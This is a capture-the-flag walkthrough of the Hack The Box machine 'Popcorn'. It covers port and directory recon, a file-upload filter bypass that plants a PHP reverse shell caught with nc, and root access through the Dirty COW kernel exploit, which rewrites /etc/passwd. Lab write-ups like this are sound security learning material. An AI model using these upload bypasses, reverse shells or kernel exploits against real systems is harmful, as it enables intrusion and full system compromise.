# recon
- 22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))

## gobuster
- /cgi-bin/ (Status: 403) -> forbiden
- /index (Status: 200)
- /rename (Status: 301) `index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name`
- /test (Status: 200) -> phpinfo()
- /torrent (Status: 301) -> Torrent hoster

### Torrent hoster
```
/admin (Status: 301)
/.htpasswd (Status: 403)
/browse (Status: 200)
/comment (Status: 200)
/config (Status: 200)
/css (Status: 301)
/database (Status: 301)
/download (Status: 200)
/edit (Status: 200)
/health (Status: 301)
/hide (Status: 200)
/images (Status: 301)
/index (Status: 200)
/js (Status: 301)
/lib (Status: 301)
/login (Status: 200)
/logout (Status: 200)
/preview (Status: 200)
/readme (Status: 301)
/rss (Status: 200)
/secure (Status: 200)
/stylesheet (Status: 200)
/templates (Status: 301)
/thumbnail (Status: 200)
/torrents (Status: 301)
/upload (Status: 301)
/upload_file (Status: 200)
/users (Status: 301)
/validator (Status: 200)
```
Always using happy path to understand the application. I notice that I can upload a picture on the server after I publish a torrent on the application. I uploaded a picture of cute cat, the picture is then save in `/torrent/upload/`


so we can try to upload a malicious php as a picture and visti `/torrent/upload/` to execute the file.... It didnt works. so I ran `burp` to intercept the request and check it out.
```
Content-Disposition: form-data; name="file"; filename="cutiecat.php.png"
Content-Type: image/png
```
I changed `filename="cutiecat.php.png"` to `filename="cutiecat.php"` now check. the page `/torrent/upload/` and check if our reveseshell got upload and BOOM it is there. now view our .php to get a reverse shell!!
```
[10.10.14.43]-kali@kali:~/HTB/popcorn$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.10.14.43] from (UNKNOWN) [10.10.10.6] 51870
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 17:36:03 up 13:22,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ python -c "import pty; pty.spawn('/bin/bash')"
www-data@popcorn:/$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Mar 17  2017 .
drwxr-xr-x 21 root   root   4096 Oct 31 04:13 ..
drwxr-xr-x  3 george george 4096 Oct 26 19:35 george
www-data@popcorn:/home/george$ ls -l
ls -l
total 836
-rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip
-rw-r--r-- 1 george george     33 Oct 31 04:14 user.txt
```
nice we have permission to `r` on `george` directory, grab user flag and let recon to gain root.
# root
linpeas.sh dont gave much info, we found some password for database and we know that the kernel is old. I also find `motd`. I tried to exploit popcorn with motd but it didnt work. `dos2unix 14339.sh` didn't help either. when I excecute the exploit it asked me for www-data password which I do not have... So I go for kernel exploitation instead, dirty cow!
```console
www-data@popcorn:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread dirty.c -o dirty -lcrypt
www-data@popcorn:/tmp$ chmod +x dirty
chmod +x dirty
www-data@popcorn:/tmp$ ./dirty
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: <leave it empty>

Complete line:
firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash

mmap: b7879000
^C
[10.10.14.43]-kali@kali:~/HTB/popcorn$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.10.14.43] from (UNKNOWN) [10.10.10.6] 38532
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 19:06:29 up 40 min,  0 users,  load average: 1.79, 1.26, 0.86
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ python -c "import pty; pty.spawn('/bin/bash')"
www-data@popcorn:/$ su - firefart
su - firefart
Password: <leave it empty>

firefart@popcorn:~# ls
ls
root.txt
```